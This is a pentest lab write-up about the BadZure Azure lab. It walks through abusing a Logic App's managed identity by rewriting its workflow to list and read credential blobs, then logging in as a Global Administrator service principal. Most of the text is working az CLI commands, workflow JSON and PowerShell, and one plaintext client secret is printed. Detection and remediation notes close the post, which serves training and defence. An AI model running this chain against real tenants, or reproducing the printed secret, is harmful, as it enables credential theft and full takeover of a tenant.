---
title: "BadZure: Managed Identity Abuse via Logic App"
date: 2026-05-14 00:03:00 +0000
categories: [Azure, Pentesting]
tags: [azure, managed-identity, logic-app, badzure, credential-injection, storage]
---

## Overview

**Technique:** Managed Identity Abuse via Logic App Workflow Modification  
**Initial Access:** VectorProcessorCore service principal (hardcoded credentials)  
**Outcome:** MI token → storage blob listing → credential exfiltration → NetBoosterBlast SP → Global Administrator  
**Environment:** BadZure lab, Azure Logic App with system-assigned managed identity  

---

## Attack Chain

```
VectorProcessorCore SP credentials
        ↓
Reader + Logic App Contributor on Legal-Contract-Wf
        ↓
Modify workflow — list blobs via ManagedServiceIdentity auth
        ↓
Trigger → read run history → XML blob listing → filenames
        ↓
Modify workflow — fetch credential files by name
        ↓
Trigger → read run history → NetBoosterBlast appId + secret
        ↓
Authenticate as NetBoosterBlast (Global Administrator)
        ↓
Tenant Owned
```

---

## Step 1 - Initial Access

VectorProcessorCore SP credentials given by BadZure build with terraform:

```
appId:  0967cc41-3154-4321-ba8c-49c9d5c9c0c9
tenant: 97b...
```

Authenticated as VectorProcessorCore:

```powershell
az login --service-principal -u "0967cc41-3154-4321-ba8c-49c9d5c9c0c9" -p "<secret>" --tenant "97b0.......dea3" --allow-no-subscriptions
```

---

## Step 2 - Enumeration

Checked role assignments for VectorProcessorCore (SP object ID `94e51921`):

```bash
az role assignment list --assignee 94e51921-1233-468b-adfb-77bd704a7254 --all --output table
```

Findings:
- `Reader` at subscription scope
- `Logic App Contributor` on `Legal-Contract-Wf` in `RND-Innovation-RG`

Checked the Logic App's managed identity:

```powershell
az logic workflow show --name Legal-Contract-Wf --resource-group RND-Innovation-RG --query "identity"
```

MI principal ID: `b9c14ede-4257-4714-b394-d4b5415db75c`

Checked MI role assignments:

```bash
az role assignment list --assignee b9c14ede-4257-4714-b394-d4b5415db75c --all --output table
```

Findings:
- `Storage Blob Data Reader` on `prodshareddatastored98` in `Marketing-Analytics-RG`
- `Storage Account Contributor` on `prodshareddatastored98`

**Note on MI identity:** The role assignments returned a different principal ID (`c99c7ed2`) than the Entra principal ID (`b9c14ede`). This is might be because system-assigned MIs have two identifiers: the Entra principal ID and a separate Azure RBAC object ID. Both refer to the same identity. The RBAC object ID does not exist as an Entra directory object and will 404 on Graph API lookups.

---

## Step 3 - Blob Discovery via Workflow (Phase 1)

I tired retrieving the current workflow definition but it was empty (no triggers or actions):

```bash
az logic workflow show --name Legal-Contract-Wf --resource-group RND-Innovation-RG --query "definition"
```

I don't have read access for the storage account so I'm not able to read the blob names or the blob contents so I will have to deploye a workflow that uses the Logic App MI to list blobs in the target container. The `x-ms-version` header is required for the Azure Blob Service XML listing endpoint — without it the request returns 403 even with valid MI auth:

```powershell
$full = @'
{
  "definition": {
    "$schema": "https://schema.management.azure.com/providers/Microsoft.Logic/schemas/2016-06-01/workflowdefinition.json#",
    "contentVersion": "1.0.0.0",
    "triggers": {
      "manual": {
        "type": "Request",
        "kind": "Http",
        "inputs": { "schema": {} }
      }
    },
    "actions": {
      "List_Blobs": {
        "type": "Http",
        "inputs": {
          "method": "GET",
          "uri": "https://prodshareddatastored98.blob.core.windows.net/mi-credentials?restype=container&comp=list",
          "headers": { "x-ms-version": "2020-04-08" },
          "authentication": {
            "type": "ManagedServiceIdentity",
            "audience": "https://storage.azure.com/"
          }
        }
      }
    }
  }
}
'@

$full | Out-File "$env:TEMP\workflow.json" -Encoding utf8

az logic workflow update `
  --name Legal-Contract-Wf `
  --resource-group RND-Innovation-RG `
  --definition "@$env:TEMP\workflow.json"
```

Got the trigger callback URL and fired the workflow:

```powershell
$callbackUrl = az rest --method POST --url "https://management.azure.com/subscriptions/035.../resourceGroups/RND-Innovation-RG/providers/Microsoft.Logic/workflows/Legal-Contract-Wf/triggers/manual/listCallbackUrl?api-version=2016-06-01" --query "value" -o tsv

Invoke-RestMethod -Uri $callbackUrl -Method POST
```

Logic apps can exfiltrate output to a webhook url but it's easier to just read the run history output. The response body is base64 encoded XML:

```powershell
$runId = az rest --method GET --url "https://management.azure.com/subscriptions/035.../resourceGroups/RND-Innovation-RG/providers/Microsoft.Logic/workflows/Legal-Contract-Wf/runs?api-version=2016-06-01" --query "value[0].name" -o tsv

$outputsUri = az rest --method GET --url "https://management.azure.com/subscriptions/035.../resourceGroups/RND-Innovation-RG/providers/Microsoft.Logic/workflows/Legal-Contract-Wf/runs/$runId/actions/List_Blobs?api-version=2016-06-01" --query "properties.outputsLink.uri" -o tsv

$response = Invoke-RestMethod -Uri $outputsUri
$b64 = $response.body.'$content'
$xml = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))
$xml
```

Decoded XML revealed two blobs in the `mi-credentials` container:
- `NetBoosterBlast-app-id.txt`
- `NetBoosterBlast-secret.txt`

---

## Step 4 - Credential Exfiltration (Phase 2)

Updated the workflow to fetch both files in a single run:

```powershell
$full = @'
{
  "definition": {
    "$schema": "https://schema.management.azure.com/providers/Microsoft.Logic/schemas/2016-06-01/workflowdefinition.json#",
    "contentVersion": "1.0.0.0",
    "triggers": {
      "manual": {
        "type": "Request",
        "kind": "Http",
        "inputs": { "schema": {} }
      }
    },
    "actions": {
      "Get_AppId": {
        "type": "Http",
        "inputs": {
          "method": "GET",
          "uri": "https://prodshareddatastored98.blob.core.windows.net/mi-credentials/NetBoosterBlast-app-id.txt",
          "headers": { "x-ms-version": "2020-04-08" },
          "authentication": {
            "type": "ManagedServiceIdentity",
            "audience": "https://storage.azure.com/"
          }
        }
      },
      "Get_Secret": {
        "type": "Http",
        "runAfter": { "Get_AppId": ["Succeeded"] },
        "inputs": {
          "method": "GET",
          "uri": "https://prodshareddatastored98.blob.core.windows.net/mi-credentials/NetBoosterBlast-secret.txt",
          "headers": { "x-ms-version": "2020-04-08" },
          "authentication": {
            "type": "ManagedServiceIdentity",
            "audience": "https://storage.azure.com/"
          }
        }
      }
    }
  }
}
'@

$full | Out-File "$env:TEMP\workflow.json" -Encoding utf8
az logic workflow update `
  --name Legal-Contract-Wf `
  --resource-group RND-Innovation-RG `
  --definition "@$env:TEMP\workflow.json"
```

Triggered and decoded both outputs in one loop:

```powershell
$callbackUrl = az rest --method POST `
  --url "https://management.azure.com/subscriptions/035.../resourceGroups/RND-Innovation-RG/providers/Microsoft.Logic/workflows/Legal-Contract-Wf/triggers/manual/listCallbackUrl?api-version=2016-06-01" `
  --query "value" -o tsv

Invoke-RestMethod -Uri $callbackUrl -Method POST
Start-Sleep -Seconds 5

$runId = az rest --method GET `
  --url "https://management.azure.com/subscriptions/035.../resourceGroups/RND-Innovation-RG/providers/Microsoft.Logic/workflows/Legal-Contract-Wf/runs?api-version=2016-06-01" `
  --query "value[0].name" -o tsv

foreach ($action in @("Get_AppId", "Get_Secret")) {
    $uri = az rest --method GET `
      --url "https://management.azure.com/subscriptions/035.../resourceGroups/RND-Innovation-RG/providers/Microsoft.Logic/workflows/Legal-Contract-Wf/runs/$runId/actions/$action`?api-version=2016-06-01" `
      --query "properties.outputsLink.uri" -o tsv
    $r = Invoke-RestMethod -Uri $uri
    $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($r.body.'$content'))
    Write-Host "$action`: $decoded"
}
```

Output:
```
Get_AppId: 80119eca-350f-419e-ae58-9e202b1a688d
Get_Secret: RsW8Q~MwdFMWrzLQuSGgyG9VnAWyGGKaDeZoic_5
```

---

## Step 5 - Authenticate as NetBoosterBlast

```powershell
az login --service-principal -u "80119eca-350f-419e-ae58-9e202b1a688d" -p "RsW8Q~MwdFMWrzLQuSGgyG9VnAWyGGKaDeZoic_5" --tenant "97b0......6dea3" --allow-no-subscriptions
```

Confirmed Global Administrator via direct role assignment query:

```powershell
az rest --method GET --url "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments?\$filter=principalId eq '3668131a-a7c5-45b6-add8-985f157030e9'" --query "value[].roleDefinitionId"
```

Role `62e90394-69f5-4237-9190-012177145e10` = Global Administrator. Tenant owned.

---

## Key Takeaways

**Why this works:**
- `Logic App Contributor` grants `Microsoft.Logic/workflows/write`  a full workflow definition modification including authentication configuration
- Logic Apps support `ManagedServiceIdentity` authentication natively in HTTP actions, allowing the workflow to authenticate as the Logic App MI without ever exposing a token
- Run history is retained by default and stores full action inputs and outputs including HTTP response bodies, a reliable exfiltration channel that requires no additional tooling
- Credentials stored in blob storage are accessible to any identity with `Storage Blob Data Reader`

**Two-phase blob attack:**
When blob filenames are unknown, use a two-phase approach: first list container contents via `?restype=container&comp=list` to discover filenames, then fetch specific blobs by name. The `x-ms-version` header is required for the XML blob listing endpoint  without it the request returns 403 even with valid MI authentication and correct RBAC permissions.

**Logic App vs Function App MI abuse:**
Both paths abuse managed identity but through different primitives. Function App MI abuse requires code deployment (Website Contributor) and direct IMDS token queries from within the execution environment. Logic App MI abuse requires only workflow modification (Logic App Contributor) and uses the native `ManagedServiceIdentity` authentication type  no code, no IMDS, no token handling in user-controlled code. The Logic App path is stealthier since it uses a supported, documented authentication pattern.

**Direct role assignment vs app role assignment:**
NetBoosterBlast's Global Administrator was assigned via direct directory role assignment (`roleManagement/directory/roleAssignments`) rather than Graph API app role assignment (`appRoleAssignments`). Querying only `appRoleAssignments` will miss direct role assignments  always check both endpoints when enumerating SP privileges.

**MI dual identity:**
System-assigned managed identities have two identifiers, an Entra principal ID and an Azure RBAC object ID. When querying role assignments via `az role assignment list --assignee <entra-principal-id>`, Azure returns results with the RBAC object ID in the `Principal` column, not the Entra principal ID. The RBAC object ID does not exist as an Entra directory object and will 404 on Graph API lookups. This is expected behaviour, not an error.

**Detection opportunities:**
- `Microsoft.Logic/workflows/write` events in Activity Log  workflow definition changes
- Listing of the storage account keys seen in the Activity Log
- Unexpected HTTP actions added to workflows targeting storage or Key Vault endpoints
- MI authentication events from Logic Apps to storage accounts outside normal workflow patterns
- Run history showing blob read operations on sensitive containers
- Dormant SP authentications following Logic App execution

**Remediation:**
- Scope Logic App Contributor to specific Logic Apps, not resource groups or subscriptions
- Alert on Logic App workflow definition changes via Azure Policy or Activity Log alert rules
- Store credentials in Key Vault, not blob storage, Storage Blob Data Reader on a container holding credentials is a credential exfiltration risk
- Disable or restrict run history retention for workflows with elevated MI permissions
- Audit storage accounts for containers holding credential files
